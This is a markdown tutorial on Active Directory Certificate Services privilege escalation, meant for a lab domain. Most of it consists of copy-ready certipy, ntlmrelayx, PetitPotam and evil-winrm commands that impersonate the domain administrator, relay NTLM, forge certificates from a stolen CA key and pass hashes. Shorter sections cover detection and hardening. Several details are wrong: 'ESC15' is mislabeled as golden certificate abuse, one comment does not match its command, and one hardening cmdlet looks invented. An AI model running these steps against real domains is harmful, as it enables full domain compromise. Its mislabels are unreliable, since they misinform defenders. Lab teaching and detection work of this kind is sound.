# 🏴 Active Directory Certificate Services (AD CS) Escalation – Complete ESC Series Guide ..beta..

*A comprehensive, modern reference for authorized security testing and blue team defense*

---

## 📋 Table of Contents

1. [Introduction](#1-introduction)
2. [Lab Environment](#2-lab-environment)
3. [Enumeration](#3-enumeration)
4. [ESC1-ESC15 Exploitation](#4-esc-vulnerabilities)
5. [Detection & Monitoring](#5-detection--monitoring)
6. [Remediation](#6-remediation--hardening)
7. [References](#7-references)

---

## 1. Introduction

**Active Directory Certificate Services (AD CS)** provides Public Key Infrastructure (PKI) within Windows domains. Misconfigurations in certificate templates, enrollment permissions, and CA settings can allow privilege escalation and persistence.

### What Changed in 2024-2025?

- **New ESC vectors** (ESC13, ESC14, ESC15) discovered
- **Enhanced detection** via Microsoft Defender for Identity
- **Certipy v4.x** with improved automation
- **Bloodhound CE** integration for certificate abuse paths

---

## 2. Lab Environment

| Component | Details |
|-----------|---------|
| **Domain** | `lab.local` |
| **Domain Controller** | `DC01.lab.local` (10.10.10.10) |
| **CA Server** | `DC01-CA` (Enterprise Root CA) |
| **Attacker Machine** | Kali Linux 2025.1 / Windows 11 VM |
| **Test Account** | `student@lab.local` : `Passw0rd!` |

### Required Tools

```bash
# Python tools (Linux/macOS)
pipx install certipy-ad==4.8.2
pipx install impacket==0.11.0
pipx install bloodhound
pipx install evil-winrm

# Windows tools
# Download from GitHub releases:
# - Certify.exe (GhostPack)
# - Rubeus.exe (GhostPack)
# - SharpCollection (various)
```

---

## 3. Enumeration

### 3.1 Automated Discovery with Certipy

```bash
# Full enumeration with vulnerability analysis
certipy find \
  -u 'student@lab.local' \
  -p 'Passw0rd!' \
  -dc-ip 10.10.10.10 \
  -vulnerable \
  -json \
  -output certipy_output

# Outputs:
# - certipy_output.json (for parsing)
# - certipy_output_Certipy.txt (human-readable)
# - certipy_output_BloodHound.zip (import to BH)
```

### 3.2 Network-Wide CA Discovery

```bash
# NetExec (formerly CrackMapExec)
nxc smb 10.10.10.0/24 \
  -u student \
  -p 'Passw0rd!' \
  -M adcs

# Nmap certificate enumeration
nmap -p 445,135,9389 \
  --script smb-enum-domains,ldap-rootdse \
  10.10.10.0/24

# PowerShell (from domain-joined Windows)
Get-ADObject -Filter * -SearchBase "CN=Public Key Services,CN=Services,CN=Configuration,DC=lab,DC=local" | Select Name
```

### 3.3 BloodHound Integration

```bash
# Modern collection
bloodhound-python -u student -p 'Passw0rd!' \
  -d lab.local \
  -ns 10.10.10.10 \
  -c All,ADCS

# Query in BloodHound:
# "Find all certificate templates where Domain Users can enroll"
# "Shortest path from student to Domain Admin via certificates"
```

### 3.4 Multi-CA Environment Detection

```
        ┌─────────────────────────┐
        │  DC01.lab.local         │
        │  Root Enterprise CA     │
        │  (Primary, monitored)   │
        └───────────┬─────────────┘
                    │
        ┌───────────┴─────────────┐
        │                         │
┌───────▼──────────┐    ┌────────▼─────────┐
│ FILE01.lab.local │    │ MGMT01.lab.local │
│ "Legacy-CA"      │    │ "Test-CA"        │
│ (Often missed)   │    │ (Standalone)     │
└──────────────────┘    └──────────────────┘
```

---

## 4. ESC Vulnerabilities

### ESC1 – Enrollee Supplies Subject (SAN Abuse)

**Condition:** Template allows requestor to specify Subject Alternative Name

```bash
# Identify vulnerable templates
certipy find -u student@lab.local -p 'Passw0rd!' \
  -dc-ip 10.10.10.10 -vulnerable | grep -A 10 "ESC1"

# Request certificate as Domain Admin
certipy req \
  -u student@lab.local \
  -p 'Passw0rd!' \
  -target dc01.lab.local \
  -ca 'lab-DC01-CA' \
  -template 'VulnerableTemplate' \
  -upn 'administrator@lab.local' \
  -dns 'dc01.lab.local'

# Authenticate and retrieve NTLM hash
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10

# Use hash for access
evil-winrm -i dc01.lab.local -u administrator -H <NTLM_hash>
```

### ESC2 – Any Purpose EKU or No EKU

**Condition:** Certificate can be used for any purpose

```bash
# Find ESC2 templates
certipy find -u student@lab.local -p 'Passw0rd!' \
  -dc-ip 10.10.10.10 -vulnerable -stdout | grep "ESC2"

# Request with SAN
certipy req -u student@lab.local -p 'Passw0rd!' \
  -target dc01.lab.local -ca 'lab-DC01-CA' \
  -template 'ESC2Template' -upn 'administrator@lab.local'
```

### ESC3 – Enrollment Agent Template

**Condition:** Template allows requesting certificates on behalf of others

```bash
# Step 1: Request enrollment agent certificate
certipy req -u student@lab.local -p 'Passw0rd!' \
  -target dc01.lab.local -ca 'lab-DC01-CA' \
  -template 'EnrollmentAgent'

# Step 2: Use agent cert to request admin certificate
certipy req -u student@lab.local -p 'Passw0rd!' \
  -target dc01.lab.local -ca 'lab-DC01-CA' \
  -template 'User' \
  -on-behalf-of 'lab\administrator' \
  -pfx enrollmentagent.pfx
```

### ESC4 – Vulnerable Access Control

**Condition:** Attacker can modify vulnerable template

```bash
# Check writeable templates
certipy find -u student@lab.local -p 'Passw0rd!' \
  -dc-ip 10.10.10.10 -vulnerable -stdout | grep "ESC4"

# Add SAN flag to template (requires write access)
certipy template \
  -u student@lab.local \
  -p 'Passw0rd!' \
  -dc-ip 10.10.10.10 \
  -template 'VulnerableTemplate' \
  -save-old
```

### ESC6 – EDITF_ATTRIBUTESUBJECTALTNAME2

**Condition:** CA misconfiguration allowing SAN in any request

```bash
# Check if CA has dangerous flag
certutil -config "dc01.lab.local\lab-DC01-CA" -getreg policy\EditFlags

# If 0x40000 is set, exploit any template:
certipy req -u student@lab.local -p 'Passw0rd!' \
  -ca 'lab-DC01-CA' -target dc01.lab.local \
  -template 'User' -upn 'administrator@lab.local'
```

### ESC7 – Vulnerable CA Permissions

**Condition:** ManageCA or ManageCertificates permissions

```bash
# Add yourself as officer
certipy ca -u student@lab.local -p 'Passw0rd!' \
  -target dc01.lab.local -ca 'lab-DC01-CA' -add-officer student

# Enable ESC6 flag
certipy ca -u student@lab.local -p 'Passw0rd!' \
  -target dc01.lab.local -ca 'lab-DC01-CA' \
  -enable-template 'SubCA'
```

### ESC8 – NTLM Relay to AD CS HTTP Endpoints

**Condition:** Web Enrollment enabled, EPA not enforced

```bash
# Start ntlmrelayx targeting web enrollment
ntlmrelayx.py -t http://dc01.lab.local/certsrv/certfnsh.asp \
  -smb2support \
  --adcs \
  --template 'DomainController'

# Trigger authentication (e.g., PetitPotam)
python3 PetitPotam.py -u student -p 'Passw0rd!' \
  -d lab.local \
  <attacker_ip> dc01.lab.local
```

### ESC9 – No Security Extension (CT_FLAG_NO_SECURITY_EXTENSION)

**Condition:** Template doesn't embed security extension, allowing UPN change

```bash
# Change UPN of attacker account
Set-ADUser student -UserPrincipalName 'administrator@lab.local'

# Request certificate (embedded UPN is now admin)
certipy req -u student@lab.local -p 'Passw0rd!' \
  -ca 'lab-DC01-CA' -target dc01.lab.local \
  -template 'ESC9Template'

# Change UPN back
Set-ADUser student -UserPrincipalName 'student@lab.local'

# Authenticate with certificate
certipy auth -pfx student.pfx
```

### ESC13 – Issuance Policy Bypass (2024)

**Condition:** OID group link allows group membership bypass

```bash
# Identify vulnerable OID mappings
certipy find -u student@lab.local -p 'Passw0rd!' \
  -dc-ip 10.10.10.10 -vulnerable -stdout | grep "ESC13"

# Exploit requires certificate request through vulnerable policy
```

### ESC15 – Golden Certificate via CA Backup (2025)

**Condition:** Access to CA private key backup

```bash
# Extract CA certificate and private key (requires admin on CA)
certipy ca -u administrator@lab.local -p 'Passw0rd!' \
  -target dc01.lab.local -ca 'lab-DC01-CA' -backup

# Forge arbitrary certificates
certipy forge -ca-pfx lab-DC01-CA.pfx \
  -upn 'administrator@lab.local' \
  -subject 'CN=Administrator,CN=Users,DC=lab,DC=local'
```

---

## 5. Detection & Monitoring

### 5.1 Event Log Monitoring

```powershell
# Key Event IDs to monitor
# 4886: Certificate Services received certificate request
# 4887: Certificate Services approved and issued certificate
# 4888: Certificate Services denied certificate request
# 4890: Certificate Services template security settings changed

# Query suspicious activity
Get-WinEvent -FilterHashtable @{
  LogName='Security'
  ID=4886,4887
} | Where-Object {
  $_.Properties[1].Value -match 'administrator' -and
  $_.Properties[0].Value -notmatch 'DC01'
}
```

### 5.2 Microsoft Defender for Identity

- Enable **ADCS alerts** in Defender XDR
- Monitor for "Suspicious certificate request" alerts
- Track unusual authentication via certificates

### 5.3 Custom Detection Rules

```yaml
# Sigma rule example
title: Suspicious Certificate Request with SAN
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4886
    RequestAttributes|contains:
      - 'SAN:'
      - 'san:'
  condition: selection
level: high
```

### 5.4 Splunk Query

```spl
index=windows EventCode=4887 
| rex field=Attributes "SAN:(?<san_value>[^\s]+)"
| where isnotnull(san_value)
| stats count by Requester, san_value, Template
```

---

## 6. Remediation & Hardening

### 6.1 Template Hardening

```powershell
# Disable "Enrollee Supplies Subject" flag
$template = Get-CATemplate -Name "VulnerableTemplate"
$template | Set-CATemplate -Flag @{
  ENROLLEE_SUPPLIES_SUBJECT = $false
}

# Restrict enrollment permissions
Remove-CATemplatePermission -Template "VulnerableTemplate" `
  -Identity "Domain Users" -AccessType Enroll

Add-CATemplatePermission -Template "VulnerableTemplate" `
  -Identity "Approved-Users-Group" -AccessType Enroll
```

### 6.2 CA Configuration

```cmd
REM Disable HTTP web enrollment
certutil -setreg CA\CRLFlags +CRLF_REVCHECK_IGNORE_OFFLINE

REM Disable EDITF_ATTRIBUTESUBJECTALTNAME2
certutil -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2

REM Restart CA service
net stop certsvc && net start certsvc
```

### 6.3 Comprehensive Checklist

- [ ] Audit all templates with `certipy find -vulnerable`
- [ ] Remove "Authenticated Users" from enrollment ACLs
- [ ] Enable Manager Approval on sensitive templates
- [ ] Disable HTTP Web Enrollment endpoints
- [ ] Enable Extended Protection for Authentication (EPA)
- [ ] Monitor Event IDs 4886-4890
- [ ] Implement certificate-based conditional access
- [ ] Regular CA private key rotation
- [ ] Disable legacy templates (pre-2008)
- [ ] Implement Certificate Transparency monitoring

---

## 7. References

### Official Documentation

- [Microsoft AD CS Security Guide](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/ad-cs-security-guidance)
- [NIST SP 800-57 Key Management](https://csrc.nist.gov/publications/detail/sp/800-57-part-1/rev-5/final)

### Research Papers

- [SpecterOps – Certified Pre-Owned (2021)](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [ESC9-ESC15 Research by ly4k (2024)](https://research.ifcr.dk/)

### Tools

- [Certipy v4.x](https://github.com/ly4k/Certipy)
- [Certify.exe](https://github.com/GhostPack/Certify)
- [BloodHound CE](https://github.com/SpecterOps/BloodHound)
- [PKINITtools](https://github.com/dirkjanm/PKINITtools)

---

## ⚠️ Legal Disclaimer

**This material is strictly for:**

- Authorized penetration testing with written permission
- Educational purposes in controlled lab environments
- Security research with ethical disclosure



##
##
